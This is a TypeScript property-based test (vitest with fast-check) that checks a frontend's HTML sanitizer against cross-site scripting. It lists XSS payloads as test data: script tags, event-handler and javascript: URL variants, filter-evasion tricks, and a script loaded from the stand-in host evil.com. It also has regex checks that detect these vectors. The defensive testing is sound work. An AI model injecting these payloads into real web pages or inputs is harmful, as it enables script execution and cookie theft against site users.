// Feature: frontend-ui, Property 6: 流式 Markdown 渲染 XSS 防御不变量
// **Validates: Requirements 1.2**

import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { sanitizeHtml } from '@/lib/sanitize';

/**
 * Arbitrary: generates random malicious HTML/JS payloads.
 * Covers script tags, on* event handlers, javascript: protocol,
 * onerror attributes, unclosed tags, and mixed payloads.
 */
const arbMaliciousPayload: fc.Arbitrary<string> = fc.oneof(
  // Script tag variants
  fc.constantFrom(
    '<script>alert(1)</script>',
    '<SCRIPT>alert("xss")</SCRIPT>',
    '<script src="https://evil.com/xss.js"></script>',
    '<script>document.cookie</script>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<script/src="data:text/javascript,alert(1)">',
  ),
  // on* event handler variants
  fc.constantFrom(
    '<img onerror="alert(1)" src="x">',
    '<img ONERROR="alert(1)" src=x>',
    '<div onclick="alert(1)">click</div>',
    '<body onload="alert(1)">',
    '<svg onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<marquee onstart="alert(1)">',
    '<a onmouseover="alert(1)">hover</a>',
    '<img src=x onerror=alert(1)//>',
  ),
  // javascript: protocol variants
  fc.constantFrom(
    '<a href="javascript:alert(1)">click</a>',
    '<a href="JAVASCRIPT:alert(1)">click</a>',
    '<a href="java\tscript:alert(1)">click</a>',
    '<a href="&#106;avascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
  ),
  // Unclosed / malformed tags
  fc.constantFrom(
    '<script>alert(1)',
    '<img src="x" onerror="alert(1)"',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<div style="background:url(javascript:alert(1))">',
  ),
  // Mixed payloads with normal content
  fc.tuple(
    fc.constantFrom('Hello ', '你好 ', 'Test '),
    fc.constantFrom(
      '<script>alert(1)</script>',
      '<img onerror="alert(1)">',
      '<a href="javascript:void(0)">link</a>',
    ),
    fc.constantFrom(' world', ' 世界', ' end'),
  ).map(([prefix, payload, suffix]) => `${prefix}${payload}${suffix}`),
  // Random string with injected script
  fc.string({ minLength: 0, maxLength: 50 }).map(
    (s) => `${s}<script>alert('${s}')</script>${s}`,
  ),
);

/**
 * Checks that a sanitized HTML string does not contain executable script elements,
 * on* event handler attributes, or javascript: protocol links.
 */
function assertNoXSS(sanitized: string): void {
  const lower = sanitized.toLowerCase();

  // No <script> tags (opening or self-closing)
  expect(lower).not.toMatch(/<script[\s>]/);
  expect(lower).not.toMatch(/<\/script>/);

  // No on* event handler attributes (onclick, onerror, onload, onmouseover, etc.)
  expect(lower).not.toMatch(/\bon\w+\s*=/);

  // No javascript: protocol in href/src attributes
  expect(lower).not.toMatch(/href\s*=\s*["']?\s*javascript:/);
  expect(lower).not.toMatch(/src\s*=\s*["']?\s*javascript:/);
}

describe('Property 6: 流式 Markdown 渲染 XSS 防御不变量', () => {
  it('sanitizeHtml strips all executable script elements, on* handlers, and javascript: protocol', () => {
    fc.assert(
      fc.property(arbMaliciousPayload, (payload) => {
        const sanitized = sanitizeHtml(payload);
        assertNoXSS(sanitized);
      }),
      { numRuns: 150 },
    );
  });
});
